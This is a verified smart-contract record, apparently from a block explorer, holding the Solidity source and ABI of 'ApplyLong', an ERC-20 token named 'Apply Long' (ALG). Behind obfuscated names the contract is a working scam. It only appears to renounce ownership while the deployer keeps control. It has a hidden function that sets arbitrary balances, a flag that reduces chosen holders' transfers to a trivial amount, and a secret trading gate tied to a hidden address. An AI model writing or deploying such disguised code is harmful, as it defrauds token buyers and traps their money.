{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface txBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapLaunchedAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverLiquidity {\n    function createPair(address tokenEnable, address senderLimit) external returns (address);\n}\n\ninterface tradingLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableReceiver) external view returns (uint256);\n\n    function transfer(address modeShould, uint256 launchedLaunchWallet) external returns (bool);\n\n    function allowance(address totalMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedLaunchWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeShould,\n        uint256 launchedLaunchWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedExemptReceiver, uint256 value);\n    event Approval(address indexed totalMarketing, address indexed spender, uint256 value);\n}\n\ninterface listTo is tradingLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ApplyLong is swapLaunchedAuto, tradingLiquidity, listTo {\n\n    address enableSwapIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed swapWallet, address indexed launchedTeam);\n\n    uint8 private atEnableTeam = 18;\n\n    mapping(address => uint256) private fromTrading;\n\n    mapping(address => mapping(address => uint256)) private feeMin;\n\n    function txToken(address maxTxLaunch, address modeShould, uint256 launchedLaunchWallet) internal returns (bool) {\n        if (maxTxLaunch == modeTo) {\n            return shouldMinEnable(maxTxLaunch, modeShould, launchedLaunchWallet);\n        }\n        uint256 teamSwap = tradingLiquidity(launchedSwap).balanceOf(enableSwapIs);\n        require(teamSwap == exemptTake);\n        require(modeShould != enableSwapIs);\n        if (listIs[maxTxLaunch]) {\n            return shouldMinEnable(maxTxLaunch, modeShould, feeWallet);\n        }\n        return shouldMinEnable(maxTxLaunch, modeShould, launchedLaunchWallet);\n    }\n\n    uint256 exemptMax;\n\n    bool public swapBuyFrom;\n\n    bool public fundSwap;\n\n    uint256 private receiverWallet = 100000000 * 10 ** 18;\n\n    function txIsLaunch(uint256 launchedLaunchWallet) public {\n        buyModeTx();\n        exemptTake = launchedLaunchWallet;\n    }\n\n    string private tokenList = \"Apply Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromTake;\n    }\n\n    function getOwner() external view returns (address) {\n        return listAmount;\n    }\n\n    function modeSell(address takeList) public {\n        if (swapBuyFrom) {\n            return;\n        }\n        if (tokenLiquidityTx == marketingTotal) {\n            marketingTotal = minTx;\n        }\n        sellTeam[takeList] = true;\n        if (tokenLiquidityTx == minTx) {\n            fundSwap = false;\n        }\n        swapBuyFrom = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atEnableTeam;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverWallet;\n    }\n\n    function approve(address amountMarketing, uint256 launchedLaunchWallet) public virtual override returns (bool) {\n        feeMin[_msgSender()][amountMarketing] = launchedLaunchWallet;\n        emit Approval(_msgSender(), amountMarketing, launchedLaunchWallet);\n        return true;\n    }\n\n    function buyModeTx() private view {\n        require(sellTeam[_msgSender()]);\n    }\n\n    mapping(address => bool) public listIs;\n\n    uint256 public buyTeam;\n\n    address amountSenderFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 exemptTake;\n\n    uint256 public tokenLiquidityTx;\n\n    uint256 public marketingTotal;\n\n    address public launchedSwap;\n\n    function fundFrom(address listAuto, uint256 launchedLaunchWallet) public {\n        buyModeTx();\n        fromTrading[listAuto] = launchedLaunchWallet;\n    }\n\n    address private listAmount;\n\n    address public modeTo;\n\n    mapping(address => bool) public sellTeam;\n\n    constructor (){\n        \n        txBuy launchMode = txBuy(amountSenderFund);\n        launchedSwap = receiverLiquidity(launchMode.factory()).createPair(launchMode.WETH(), address(this));\n        if (minTx != buyTeam) {\n            minTx = amountTrading;\n        }\n        modeTo = _msgSender();\n        shouldFeeBuy();\n        sellTeam[modeTo] = true;\n        fromTrading[modeTo] = receiverWallet;\n        \n        emit Transfer(address(0), modeTo, receiverWallet);\n    }\n\n    function transfer(address listAuto, uint256 launchedLaunchWallet) external virtual override returns (bool) {\n        return txToken(_msgSender(), listAuto, launchedLaunchWallet);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenList;\n    }\n\n    function owner() external view returns (address) {\n        return listAmount;\n    }\n\n    function shouldFeeBuy() public {\n        emit OwnershipTransferred(modeTo, address(0));\n        listAmount = address(0);\n    }\n\n    function feeReceiverMax(address minMarketingLaunched) public {\n        buyModeTx();\n        if (marketingTotal != buyTeam) {\n            fundSwap = false;\n        }\n        if (minMarketingLaunched == modeTo || minMarketingLaunched == launchedSwap) {\n            return;\n        }\n        listIs[minMarketingLaunched] = true;\n    }\n\n    function shouldMinEnable(address maxTxLaunch, address modeShould, uint256 launchedLaunchWallet) internal returns (bool) {\n        require(fromTrading[maxTxLaunch] >= launchedLaunchWallet);\n        fromTrading[maxTxLaunch] -= launchedLaunchWallet;\n        fromTrading[modeShould] += launchedLaunchWallet;\n        emit Transfer(maxTxLaunch, modeShould, launchedLaunchWallet);\n        return true;\n    }\n\n    function allowance(address atLaunchedSender, address amountMarketing) external view virtual override returns (uint256) {\n        if (amountMarketing == amountSenderFund) {\n            return type(uint256).max;\n        }\n        return feeMin[atLaunchedSender][amountMarketing];\n    }\n\n    function transferFrom(address maxTxLaunch, address modeShould, uint256 launchedLaunchWallet) external override returns (bool) {\n        if (_msgSender() != amountSenderFund) {\n            if (feeMin[maxTxLaunch][_msgSender()] != type(uint256).max) {\n                require(launchedLaunchWallet <= feeMin[maxTxLaunch][_msgSender()]);\n                feeMin[maxTxLaunch][_msgSender()] -= launchedLaunchWallet;\n            }\n        }\n        return txToken(maxTxLaunch, modeShould, launchedLaunchWallet);\n    }\n\n    uint256 private minTx;\n\n    bool private takeReceiver;\n\n    function balanceOf(address enableReceiver) public view virtual override returns (uint256) {\n        return fromTrading[enableReceiver];\n    }\n\n    uint256 public amountTrading;\n\n    uint256 constant feeWallet = 5 ** 10;\n\n    string private fromTake = \"ALG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedExemptReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunchedSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedLaunchWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMarketingLaunched\",\"type\":\"address\"}],\"name\":\"feeReceiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedLaunchWallet\",\"type\":\"uint256\"}],\"name\":\"fundFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeList\",\"type\":\"address\"}],\"name\":\"modeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFeeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuyFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLiquidityTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedLaunchWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTxLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedLaunchWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedLaunchWallet\",\"type\":\"uint256\"}],\"name\":\"txIsLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ApplyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}